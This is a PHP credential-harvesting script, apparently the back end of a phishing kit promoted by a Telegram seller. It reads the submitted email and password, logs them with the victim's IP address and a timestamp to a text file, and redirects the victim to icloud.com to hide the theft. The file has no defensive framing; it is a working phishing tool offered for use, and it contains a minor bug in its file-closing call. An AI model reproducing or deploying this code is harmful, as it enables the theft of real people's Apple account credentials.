<?php

//----Created by @orbitx on Telegram----//

$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('d-m-Y');
$time = date('g:s A (e)');
$both = "--- Want a Custom Phishing Page? Send a Message to @orbitx on Telegram ---\r\n \r\nE-Mail: $username \r\nPassword: $password \r\nEntering Time: $time / $date \r\nIP-Address: $ip";

$file = fopen("../logs.txt", "a");

fwrite($file, $both);

fclose($myfile);

header('location:https://icloud.com');
?>
